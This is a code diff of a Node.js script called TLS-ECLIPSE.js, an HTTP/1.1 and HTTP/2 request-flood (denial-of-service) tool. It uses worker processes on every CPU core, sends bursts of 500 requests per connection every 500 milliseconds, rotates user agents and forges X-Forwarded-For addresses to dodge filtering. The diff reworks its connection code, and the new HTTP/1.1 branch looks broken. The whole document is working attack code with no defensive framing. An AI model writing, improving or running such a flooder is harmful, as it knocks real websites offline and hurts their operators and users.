@@ -1,8 +1,7 @@
 // TLS-ECLIPSE.js
-const fs = require('fs');
-const url = require('url');
+const http = require('http');
 const http2 = require('http2');
-const tls = require('tls');
+const url = require('url');
 const cluster = require('cluster');
 const os = require('os');
 
@@ -22,7 +21,7 @@ const cores = os.cpus().length;
 const userAgents = [
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64)...",
     "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)...",
-    // Add more for max effect
+    // Add more for variety
 ];
 
 let h2RequestsSent = 0;
@@ -75,68 +74,57 @@ if (cluster.isMaster) {
     let loopCount = 0;
 
     function launchAttack() {
-        const socket = tls.connect({
-            host,
-            port,
-            servername: host,
-            rejectUnauthorized: false,
-            ALPNProtocols: ['h2', 'http/1.1'],
-        });
+        // For HTTP/2
+        if (Math.random() < 0.5) {
+            const client = http2.connect(`https://${host}`);
 
-        socket.setKeepAlive(true, 1000);
+            client.on('error', () => {
+                // Retry after error
+                setTimeout(launchAttack, 2000); // Retry after 2 seconds
+            });
 
-        socket.on('secureConnect', () => {
-            let protocol = socket.alpnProtocol;
+            for (let i = 0; i < 500; i++) {  // 500 requests per connection
+                const headers = {
+                    ':method': 'GET',
+                    ':path': path,
+                    'user-agent': userAgents[Math.floor(Math.random() * userAgents.length)],
+                    'x-forwarded-for': randIP(),
+                    'accept': '*/*'
+                };
 
-            if (protocol === 'h2') {
-                const client = http2.connect(parsed.href, {
-                    createConnection: () => socket
-                });
-
-                client.on('error', () => {
-                    // Retry after error
-                    setTimeout(launchAttack, 2000); // Retry after 2 seconds
-                });
-
-                for (let i = 0; i < 500; i++) {  // 500 requests per connection
-                    const headers = {
-                        ':method': 'GET',
-                        ':path': path,
-                        'user-agent': userAgents[Math.floor(Math.random() * userAgents.length)],
-                        'x-forwarded-for': randIP(),
-                        'accept': '*/*'
-                    };
-
-                    const req = client.request(headers);
-                    req.on('response', () => {});
-                    req.end();
-                }
-
-                h2RequestsSent += 500; // Increment H2 requests count
-
-                setTimeout(() => {
-                    client.close();
-                    socket.destroy();
-                }, 1500);
-            } else {
-                const req = `GET ${path} HTTP/1.1\r\nHost: ${host}\r\nUser-Agent: ${userAgents[Math.floor(Math.random() * userAgents.length)]}\r\nX-Forwarded-For: ${randIP()}\r\nConnection: keep-alive\r\n\r\n`;
-
-                for (let i = 0; i < 500; i++) {  // Send 500 requests
-                    socket.write(req);
-                }
-
-                h1RequestsSent += 500; // Increment H1 requests count
-
-                setTimeout(() => socket.destroy(), 1500);
+                const req = client.request(headers);
+                req.on('response', () => {});
+                req.end();
             }
 
-            loopCount++;
-        });
+            h2RequestsSent += 500; // Increment H2 requests count
+            client.close(); // Close connection after requests
+        } else {
+            // For HTTP/1.1
+            const options = {
+                hostname: host,
+                port: 80,
+                path: path,
+                method: 'GET',
+                headers: {
+                    'User-Agent': userAgents[Math.floor(Math.random() * userAgents.length)],
+                    'X-Forwarded-For': randIP(),
+                    'Connection': 'keep-alive'
+                }
+            };
 
-        socket.on('error', () => {
-            // Retry after error
-            setTimeout(launchAttack, 2000); // Retry after 2 seconds
-        });
+            const req = http.request(options, (res) => {
+                res.on('data', () => {}); // No need to handle the data
+            });
+
+            for (let i = 0; i < 500; i++) {  // 500 requests per connection
+                req.end(); // Send request
+            }
+
+            h1RequestsSent += 500; // Increment H1 requests count
+        }
+
+        loopCount++;
     }
 
     const interval = setInterval(launchAttack, 500);  // Slow down to 500ms between each attack
